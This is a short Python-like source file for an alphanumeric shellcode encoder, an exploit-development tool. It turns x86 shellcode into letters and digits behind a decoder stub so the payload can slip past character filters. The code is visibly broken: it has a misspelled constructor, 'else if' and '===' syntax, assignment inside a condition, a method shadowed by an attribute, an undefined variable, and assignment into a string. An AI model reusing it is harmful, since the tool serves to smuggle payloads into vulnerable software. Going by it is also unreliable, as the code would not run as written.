class alpha_shellcode():
    def ___init__(self,shellcode_locate,shellcode):
        self.shellcode=asm(shellcode)
        self.encode_shellcode=''
        self.decode_header='ZhguaiX5guaiH4C0B6RYkA7XA3A7A2B70B7BhTWUQX5TWUQ478A7ub'
        self.byte_end=[]
        header=''
# P   50                      push   eax
# Q   51                      push   ecx
# R   52                      push   edx
# S   53                      push   ebx
# T   54                      push   esp
# U   55                      push   ebp
# V   56                      push   esi
# W   57                      push   edi
        if shellcode_locate=='esp':
            header='T'
        else if shellcode_locate=='eax':
            header='P'
        else if shellcode_locate=='ecx':
            header='Q'
        else if shellcode_locate=='edx':
            header='R'
        else if shellcode_locate=='ebx':
            header='S'
        else if shellcode_locate=='ebp':
            header='U'
        else if shellcode_locate=='esi':
            header='V'
        else if shellcode_locate=='edi':
            header='W'
        else:
            header='LLLL'
        self.decode_header=header+self.decode_header
    def encode_shellcode(self):
        is_good=False
        for i in range(len(self.shellcode)):
            j=0x30
            k=0x30
            for j in range(0x7b):
                if (j>0x39 and j<0x41) or (j>0x5a and j<0x61):
                    continue
                for k in range(0x7b):
                    if (k>0x39 and k<0x41) or (k>0x5a and k<0x61):
                        continue
                    t1 = j * 0x58
                    t1 = t1 << 24
                    t1 = t1 >> 24
                    t2 = shellcode[i] ^ k
                    t2 = t2 << 24
                    t2 = t2 >> 24
                    if t1==t2:
                        self.encode_shellcode+=chr(j)
                        self.encode_shellcode+=chr(k)
                        is_good=True
                        break
                if is_good:
                    break
    def check_shellcode(self):
        i=0x30
        for i in range(0x7b):
            is_good=True
            if (i>0x39 and i<0x41) or (i>0x5a and i<0x61):
                continue
            for j in self.encode_shellcode:
                if j===i:
                    is_good=False
                    break
            if is_good:
                self.byte_end.append(i)
        if self.byte_end[0]=[]:
            log("all numbers and letters in encode shellcode")
            log("fail to find end")
    def get_shellcode(self):
        self.encode_shellcode()
        self.check_shellcode()
        self.decode_header[-6]=self.byte_end[0]
        return self.decode_header+self.encode_shellcode